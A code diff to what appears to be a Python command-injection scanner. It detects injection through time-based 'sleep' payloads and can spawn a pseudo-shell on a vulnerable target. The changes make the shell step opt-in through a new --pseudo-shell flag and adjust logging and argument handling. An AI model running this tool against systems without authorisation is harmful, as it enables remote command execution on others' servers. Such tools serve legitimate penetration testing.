@@ -10,7 +10,10 @@ from rich.console import Console
 
 
 def main() -> int:
-    console = Console()
+    console = Console(
+        log_path=False,
+        log_time_format="@ %X -> "
+    )
 
     console.print(
         r"""
@@ -37,6 +40,7 @@ def main() -> int:
         metavar="<seconds>",
         help="Sleep time",
         required=False,
+        type=int,
         default=5,
     )
 
@@ -74,6 +78,14 @@ def main() -> int:
         default=False,
     )
 
+    parser.add_argument(
+        "--pseudo-shell",
+        help="Ask to spawn a pseudo shell",
+        required=False,
+        action="store_true",
+        default=False,
+    )
+
     arguments = parser.parse_args()
 
     url = arguments.url
@@ -90,8 +102,6 @@ def main() -> int:
         console.log("No parameter found.")
         return 1
 
-    sleep_time = 5
-
     console.log(f"Using sleep time: {sleep_time}")
 
     session = httpx.Client(
@@ -106,6 +116,10 @@ def main() -> int:
     console.log(f"Found average ping: ~ {round(average_ping, 2)}")
 
     for payload_func in build_payload_generators():
+        if isinstance(payload_func, str):
+            console.log(payload_func)
+            continue
+
         payload = payload_func(f"sleep {sleep_time}")
 
         final_url = ""
@@ -128,16 +142,16 @@ def main() -> int:
                 f"Found potential injection with payload: [red]{payload}[/] (~ {round(total_time - average_ping, 2)})"
             )
 
-            user_input = (
-                console.input("Wanna spawn a pseudo-shell? [Y/n] ") or "Y"
-            ).lower()
+            if arguments.pseudo_shell:
+                user_input = (
+                    console.input("Wanna spawn a pseudo-shell? \[y/N] ") or "N"
+                ).lower()
 
-            if user_input == "n":
-                continue
+                if user_input == "n":
+                    continue
 
-            spawn_shell(console, session, url, payload_func)
-
-            return 0
+                spawn_shell(console, session, url, payload_func)
+                return 0
 
     return 0
 
